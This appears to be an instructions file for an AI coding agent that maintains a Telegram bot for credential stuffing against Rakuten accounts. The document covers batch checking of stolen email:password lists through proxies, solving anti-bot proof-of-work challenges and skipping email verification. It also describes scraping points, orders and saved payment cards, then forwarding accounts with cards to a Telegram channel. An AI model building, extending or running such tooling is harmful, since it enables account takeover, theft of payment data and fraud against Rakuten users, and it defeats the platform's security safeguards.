Default shell is PowerShell; keep commands compatible. Avoid generating docs unless asked. Favor small, composable functions.

The user's has an apostrophe and it should be closed in quotes.

> 📖 **For comprehensive context**, see [`AI_CONTEXT.md`](AI_CONTEXT.md) — full module reference, data flows, and troubleshooting.

# Rakuten Telegram Credential Checker — AI Agent Playbook

## Architecture Overview
```
main.js                           # Bootstrap: env validation, Telegraf init, graceful shutdown
telegramHandler.js                # Command routing (.chk), input guards, response formatting
├── telegram/messages.js          # MarkdownV2 builders (escapeV2, codeV2, spoilerV2, boldV2)
├── telegram/batchHandlers.js     # File uploads + batch processing (HOTMAIL/ULP/JP/ALL)
├── telegram/combineHandler.js    # Combine mode session (/combine, /done, /cancel)
├── telegram/combineBatchRunner.js# Combine batch execution
├── telegram/channelForwarder.js  # Forward VALID to channel + delete on INVALID/update on BLOCKED
├── telegram/messageTracker.js    # Track forwarded messages with unique codes for updates/deletion
httpChecker.js                    # HTTP-based credential checker (cres POW + IP detection)
automation/batch/processedStore.js# Redis/JSONL cache with batch MGET + write buffering
automation/http/ipFetcher.js      # Exit IP detection via ipify.org
```

### HTTP Flow
`httpChecker.js` → `httpFlow.js` → `htmlAnalyzer.js` → `httpDataCapture.js`

### IP Address Detection
When a credential check returns **VALID** and a proxy is configured:
1. Fetch exit IP via `api.ipify.org` using the same session client
2. IP attached to result as `result.ipAddress`
3. Displayed in Telegram message: `🌐 IP Address: {ip}`

Implementation: `automation/http/ipFetcher.js` → `fetchIpInfo(client, timeoutMs)`

### Channel Message Tracking
Forwarded channel messages include a unique tracking code (`RK-XXXXXXXX`) for management:
- **On VALID**: Generate tracking code, append to message, store in Redis
- **On INVALID recheck**: Delete the channel message, clean up Redis refs
- **On BLOCKED recheck**: Update message to show blocked status

Redis Schema:
- `msg:{trackingCode}` → `{ messageId, chatId, username, password, forwardedAt }`
- `msg:cred:{username}:{password}` → `trackingCode` (reverse lookup)

Implementation: `telegram/messageTracker.js`, `telegram/channelForwarder.js` → `handleCredentialStatusChange()`

### Email Verification Skip
When SSO redirects to `/verification/email`, the system auto-skips:
1. Extract token from URL → call `/util/gc` (page_type: `LOGIN_START`) → get challenge token + mdata
2. Compute POW `cres` from mdata
3. POST to `/v2/verify/email` with empty `code` field = skip
4. Retry SSO authorize → now bypasses verification

Implementation: `automation/http/capture/ssoFormHandler.js` → `skipEmailVerification()`

## cres Algorithm (Proof-of-Work)
The `cres` (challenge response) is computed from `/util/gc` mdata (`{mask, key, seed}`):
1. `stringToHash = key + random(16 - key.length)` 
2. `hash = MurmurHash3_x64_128(stringToHash, seed)`
3. Loop until `hash.startsWith(mask)`
4. Return `stringToHash` as cres

Implementation: `automation/http/fingerprinting/challengeGenerator.js`

### POW Optimizations (for Batch Processing)
- **Native MurmurHash** (`murmurhash-native`): C++ bindings ~10x faster than pure JS (auto-fallback to `murmurhash3js-revisited` if build fails)
- **Worker Thread Pool** (`powWorkerPool.js`): Offloads POW to worker threads (CPU cores - 1)
- **POW Cache** (`powCache.js`): 5-minute TTL cache on `mask+key+seed` combinations
- **Async API**: Use `computeCresFromMdataAsync()` for non-blocking batch processing
- **Expected speedup**: 4-8x on multi-core systems with high cache hit rate

## Environment Variables
| Var | Required | Default | Notes |
|-----|----------|---------|-------|
| `TELEGRAM_BOT_TOKEN` | ✓ | — | From @BotFather |
| `TARGET_LOGIN_URL` | ✓ | — | Full OAuth URL with `client_id`, `redirect_uri` |
| `FORWARD_CHANNEL_ID` | | — | Channel ID to forward VALID credentials (e.g., `-1001234567890`) |
| `ALLOWED_USER_IDS` | | — | Comma-separated Telegram user IDs (empty = allow all) |
| `TIMEOUT_MS` | | `60000` | HTTP timeout |
| `BATCH_CONCURRENCY` | | `1` | Parallel checks (1 = sequential) |
| `BATCH_MAX_RETRIES` | | `1` | Retry count for ERROR results |
| `BATCH_DELAY_MS` | | `50` | Delay between request chunks (ms) |
| `BATCH_HUMAN_DELAY_MS` | | `0` | Human delay multiplier in batch mode (0=disabled, 0.1=10%) |
| `LOG_LEVEL` | | `info` | error\|warn\|info\|debug |
| `PROXY_SERVER` | | — | Proxy URL |
| `REDIS_URL` | | — | Redis connection URL (uses JSONL if not set) |

## Commands & Workflows
```powershell
npm install          # Install deps
npm start            # Run bot
$env:LOG_LEVEL="debug"; npm start  # Verbose logging
```

### Telegram Commands
- `.chk email:password` — Single credential check
- `/stop` — Abort active batch process or clear combine session
- `/combine` — Start combine mode (collect multiple files)
- `/done` — Finish combine mode, show processing options
- `/cancel` — Cancel combine session
- `/export` — Export VALID credentials from Redis as .txt file
- `/help` — Show help message

## Code Patterns

### Logging
```javascript
const { createLogger } = require('./logger');
const log = createLogger('module-name');
log.info('message');   // Prefer over console.log
log.debug('detail');   // Only shown when LOG_LEVEL=debug
```

### Telegram MarkdownV2
```javascript
const { escapeV2, codeV2, boldV2, spoilerV2, spoilerCodeV2 } = require('./telegram/messages');
// User text: escapeV2(userInput)
// Code spans: codeV2('literal')
// Credentials in summaries: spoilerCodeV2(password)  // hides + monospace
// Always reply with { parse_mode: 'MarkdownV2' }
```

### Credential Flow (Single)
`.chk email:password` → `guardInput()` validates format → `parseCredentials()` splits → `checkCredentials()` → outcome: VALID/INVALID/BLOCKED/ERROR → auto-capture on VALID → edit status message

### Batch Flow
1. User uploads file → `batch_type_hotmail_*` or `batch_type_ulp_*` callback
2. `prepareBatchFromFile()` or `prepareUlpBatch()` parses credentials
3. `filterAlreadyProcessed()` dedupes via Redis MGET batch lookup
4. `setTimeout(execute, 0)` detaches from Telegraf callback (CRITICAL)
5. Worker pool processes with `BATCH_CONCURRENCY`; progress edits throttled to ~2s
6. Summary with valid creds in spoiler format

### Combine Flow
1. `/combine` → creates session in `combineSessions` Map
2. Upload files (1-20) → files added to session
3. `/done` → downloads all files, parses & dedupes credentials
4. Select type (HOTMAIL/ULP/JP/ALL) → filters credentials
5. Confirm → `runCombineBatch()` with `setTimeout()` wrapper
6. Same processing as regular batch

### HTTP Session Pattern
```javascript
const session = createSession({ proxy, timeout });
// session = { client, jar, id, createdAt, requestCount }
closeSession(session);
```

### Outcome Detection (`htmlAnalyzer.js`)
- HTTP 200 + `sessionAlign` redirect → VALID
- HTTP 401 / JSON errorCode → INVALID
- Captcha/challenge keywords → BLOCKED
- Fallback → ERROR

### Data Capture (`httpDataCapture.js`)
```javascript
// POST to ichiba-common API after login
const capture = await captureAccountData(session);
// Returns: { points, cash, rank, latestOrder, latestOrderId, profile }
```

### Channel Forwarding (`channelForwarder.js`)
Forwards VALID credentials to channel only if:
- Has latest order (not `'n/a'`)
- Has card data (`profile.cards` with at least 1 card)

```javascript
const validation = validateCaptureForForwarding(capture);
// { valid: boolean, reason: string }

// Handle status changes for previously forwarded credentials
await handleCredentialStatusChange(telegram, username, password, 'INVALID'); // Deletes message
await handleCredentialStatusChange(telegram, username, password, 'BLOCKED'); // Updates to blocked status
```

### Message Tracking (`messageTracker.js`)
```javascript
const trackingCode = generateTrackingCode(username, password); // RK-XXXXXXXX
await storeMessageRef(trackingCode, { messageId, chatId, username, password });
const ref = await getMessageRefByCredentials(username, password); // Reverse lookup
await deleteMessageRef(username, password); // Clean up after delete
```

## File Conventions
- `automation/http/` — HTTP flow, fingerprinting, data capture, IP fetching
- `automation/batch/` — `hotmail.js`, `ulp.js`, `processedStore.js` (dedup cache)
- `telegram/` — Message builders, batch UX handlers, channel forwarding
- `scripts/` — One-time migration scripts (e.g., `migrate-redis-ttl.js`)

## Batch Domain Filter
HOTMAIL mode only accepts: `live.jp`, `hotmail.co.jp`, `hotmail.jp`, `outlook.jp`, `outlook.co.jp`, `msn.co.jp`

## Key Constants
- Telegram file download limit: 20MB
- ULP stream limit: ~1.5GB
- Processed cache TTL: 30 days (env `PROCESSED_TTL_MS`)
- Forward store TTL: 30 days (env `FORWARD_TTL_MS`)
- Message tracker TTL: 30 days
- Progress edit throttle: 5 seconds

## Deployment (Railway)
- Config: `railway.json` (Nixpacks builder, auto-restart on failure)
- Native deps: `murmurhash-native` builds on Linux, falls back to pure JS locally
- Required env vars: `TELEGRAM_BOT_TOKEN`, `TARGET_LOGIN_URL`
- **Graceful shutdown**: Waits up to 5 minutes for active batches to complete before restarting

### How Batch Resilience Works
When you push an update during an active batch:
1. Railway sends SIGTERM to old instance
2. Bot detects active batches and waits for completion (max 5 min)
3. Credentials are saved to `processedStore` immediately after each check
4. Progress messages update in real-time
5. Summary sent to user when batch completes
6. New instance starts only after old one finishes gracefully

**What's preserved:**
- ✅ All checked credentials (saved immediately to JSONL/Redis)
- ✅ Valid credentials list (shown in summary)
- ✅ Final summary message

**What's NOT preserved (edge case):**
- ❌ Credentials currently being checked (in-flight) when shutdown times out after 5 min
- ❌ Progress message if Telegram API fails (user gets final summary anyway)

**Best practices:**
- Avoid deploying during large batches (>1000 credentials)
- Use Redis (`REDIS_URL`) for better state persistence across restarts
- Monitor Railway logs to see graceful shutdown in action
